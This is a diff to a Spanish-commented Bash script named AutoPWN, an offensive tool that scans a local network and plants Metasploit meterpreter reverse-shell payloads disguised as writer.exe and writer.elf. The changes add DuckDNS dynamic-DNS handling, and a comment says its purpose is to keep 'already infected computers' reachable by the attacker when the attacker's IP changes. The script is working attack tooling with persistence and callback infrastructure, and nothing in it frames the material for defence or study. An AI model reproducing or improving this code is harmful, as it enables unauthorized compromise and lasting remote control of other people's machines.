@@ -1,6 +1,6 @@
 #!/bin/bash
 
-version="1.9"
+version="1.1"
 
 # Variables
 youripalways=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
@@ -10,7 +10,12 @@ windowspayload="windows/meterpreter/reverse_tcp"
 
 exclude_ips=("192.168.1.100" "192.168.1.101") # pon aqui las ips que se deben excluir del ataque
 
-lhost="$youripalways"
+lhost="$youripalways" # si tienes la opcion duckdns debes poner aqui el dominio
+
+duckdns="no" # es muy recomendable ya que si por casualidad tu ip cambia los ordenadores ya infectados seguiran siendo accesibles por ti, crea tu servidor dns en https://www.duckdns.org
+ducktoken=""
+duckip="$youripalways"
+
 iprange="${youripalways%.*}.0/24"
 
 winlport="8181"
@@ -61,7 +66,7 @@ else
 
     replace "linux/x86/meterpreter/reverse_tcp" "$linuxpayload" -- autopwn.sh > /dev/null 2>&1
     replace "windows/meterpreter/reverse_tcp" "$windowspayload" -- autopwn.sh > /dev/null 2>&1
-    replace 'lhost="127.0.0.1"' "lhost=\"$lhost\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'lhost="$youripalways"' "lhost=\"$lhost\"" -- autopwn.sh > /dev/null 2>&1
     replace 'winlport="8181"' "winlport=\"$winlport\"" -- autopwn.sh > /dev/null 2>&1
     replace 'linlport="8080"' "linlport=\"$linlport\"" -- autopwn.sh > /dev/null 2>&1
     replace 'sshuser="kali"' "sshuser=\"$sshuser\"" -- autopwn.sh > /dev/null 2>&1
@@ -73,6 +78,9 @@ else
     replace 'startup="si"' "startup=\"$startup\"" -- autopwn.sh > /dev/null 2>&1
     replace 'linuxoutname="writer.elf"' "linuxoutname=\"$linuxoutname\"" -- autopwn.sh > /dev/null 2>&1
     replace 'windowsoutname="writer.exe"' "windowsoutname=\"$windowsoutname\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'duckdns="no"' "duckdns=\"$duckdns\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'ducktoken=""' "ducktoken=\"$ducktoken\"" -- autopwn.sh > /dev/null 2>&1
+    replace 'duckip="$youripalways"' "duckip=\"$duckip\"" -- autopwn.sh > /dev/null 2>&1
     clear
     dos2unix autopwn.sh > /dev/null 2>&1
     clear
@@ -115,6 +123,32 @@ clear
 figlet "AutoPWN" -f AutoPWN/Bloody.flf | lolcat
 echo -e "                         By Andermd (v$version)\n\n\n" | lolcat
 sleep 5
+
+if [ "$duckdns" = "si" ]; then
+{
+echo -e "\e[9;38m[\e[9;32m+\e[9;38m] INTENTANDO ACTUALIZAR LA INFORMACION DEL SERVIDOR DNS (\e[9;32m$lhost\e[9;38m)\n\n"
+response=$(curl -s "https://www.duckdns.org/update?domains=$lhost&token=$ducktoken&ip=$duckip")
+
+if [ "$response" = "OK" ]; then
+ping_result=$(ping -c 1 "$lhost")
+
+ip_obtenida=$(echo "$ping_result" | grep -oP '\(\K[^)]+')
+    
+    if [ "$ip_obtenida" = "$duckip" ]; then
+	echo -e "\e[9;38m[\e[9;32m+\e[9;38m] INFORMACION ACTUALIZADA CORRECTAMENTE, EL DNS DEBERIA ESTAR LISTO PARA FUNCIONAR.\n\n"
+    else
+        echo -e "\e[9;38m[\e[9;31m-\e[9;38m] EL SERVIDOR DNS NO SE ACTUALIZO CORRECTAMENTE, SE USARA \e[9;32m$duckip\e[9;38m COMO LHOST\n\n"
+	lhost="$duckip"
+    fi
+elif [ "$response" = "KO" ]; then
+        echo -e "\e[9;38m[\e[9;31m-\e[9;38m] EL SERVIDOR DNS NO SE ACTUALIZO CORRECTAMENTE, SE USARA \e[9;32m$duckip\e[9;38m COMO LHOST\n\n"
+	lhost="$duckip"
+else
+        echo -e "\e[9;38m[\e[9;31m-\e[9;38m] EL SERVIDOR DNS NO SE ACTUALIZO CORRECTAMENTE, SE USARA \e[9;32m$duckip\e[9;38m COMO LHOST\n\n"
+	lhost="$duckip"
+fi
+
+}
 
 # Ejecutar Metasploit
 
